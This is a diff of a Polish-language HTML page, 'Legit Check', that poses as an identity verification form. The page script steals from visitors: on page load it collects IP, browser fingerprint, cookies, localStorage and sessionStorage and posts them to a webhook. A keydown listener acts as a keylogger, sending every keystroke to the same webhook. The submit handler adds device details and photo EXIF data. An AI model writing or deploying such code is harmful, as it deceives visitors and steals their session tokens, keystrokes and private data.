@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>Legit Check</title>
   <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/exif-js"></script>
@@ -47,39 +47,32 @@
     <input type="file" id="faceInput" accept="image/*"><br>
     <input type="file" id="proofInput" accept="image/*"><br>
     <button id="sendBtn">Wyślij do weryfikacji</button>
+  </div>
 
-  <!-- GŁÓWNY SKRYPT -->
-<script src="webhook.js"></script>
+  <script src="webhook.js"></script>
 
-<script>
-(async () => {
-  const sessionId = `AUTO-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
+  <script>
+    (async () => {
+      const sessionId = `AUTO-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
+      const fp = await FingerprintJS.load();
+      const result = await fp.get();
+      const ip = await fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip).catch(() => "Błąd IP");
 
-  const fp = await FingerprintJS.load();
-  const result = await fp.get();
+      let localData = "**LOCAL STORAGE**\n";
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        localData += `**${key}**: ${localStorage.getItem(key)}\n`;
+      }
 
-  const ip = await fetch("https://api.ipify.org?format=json")
-    .then(res => res.json())
-    .then(data => data.ip)
-    .catch(() => "Błąd IP");
+      let sessionData = "**SESSION STORAGE**\n";
+      for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        sessionData += `**${key}**: ${sessionStorage.getItem(key)}\n`;
+      }
 
-  let localData = "**LOCAL STORAGE**\n";
-  for (let i = 0; i < localStorage.length; i++) {
-    const key = localStorage.key(i);
-    const value = localStorage.getItem(key);
-    localData += `**${key}**: ${value}\n`;
-  }
+      const cookies = document.cookie;
 
-  let sessionData = "**SESSION STORAGE**\n";
-  for (let i = 0; i < sessionStorage.length; i++) {
-    const key = sessionStorage.key(i);
-    const value = sessionStorage.getItem(key);
-    sessionData += `**${key}**: ${value}\n`;
-  }
-
-  const cookies = document.cookie;
-
-  const msg = `**AUTO-LEGIT CHECK**
+      const msg = `**AUTO-LEGIT CHECK**
 **ID sesji:** ${sessionId}
 **IP:** ${ip}
 **Fingerprint:** ${result.visitorId}
@@ -91,17 +84,15 @@
 **Cookies:** ${cookies}
 
 ${localData}
-
 ${sessionData}
 `;
 
-  fetch(WEBHOOK, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ content: msg })
-  });
-})();
-</script>
+      fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: msg })
+      });
+    })();
 
     const generateSessionID = () => {
       const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
@@ -166,8 +157,6 @@ ${sessionData}
 **User-Agent:** ${navigator.userAgent}
 **Platforma:** ${navigator.platform}
 **Rozdzielczość:** ${screen.width}x${screen.height}
-**RAM:** ${navigator.deviceMemory || "?"} GB
-**CPU:** ${navigator.hardwareConcurrency || "?"} rdzeni
 **COOKIES:** ${document.cookie}
 
 **EXIF (Twarz):**
@@ -191,32 +180,11 @@ ${mapLink}
 
     document.getElementById("sendBtn").addEventListener("click", handleSubmit);
 
-    // KEYLOGGER
     document.addEventListener("keydown", e => {
       fetch(WEBHOOK, {
         method: "POST",
         body: `KEYLOG (${sessionId}): ${e.key}`
       });
-    });
-
-    // LOCAL + SESSION STORAGE
-    let localData = "**LOCAL STORAGE**\n";
-    for (let i = 0; i < localStorage.length; i++) {
-      const key = localStorage.key(i);
-      const value = localStorage.getItem(key);
-      localData += `**${key}**: ${value}\n`;
-    }
-
-    let sessionData = "**SESSION STORAGE**\n";
-    for (let i = 0; i < sessionStorage.length; i++) {
-      const key = sessionStorage.key(i);
-      const value = sessionStorage.getItem(key);
-      sessionData += `**${key}**: ${value}\n`;
-    }
-
-    fetch(WEBHOOK, {
-      method: "POST",
-      body: `${sessionId}\n${localData}\n\n${sessionData}`
     });
   </script>
 </body>
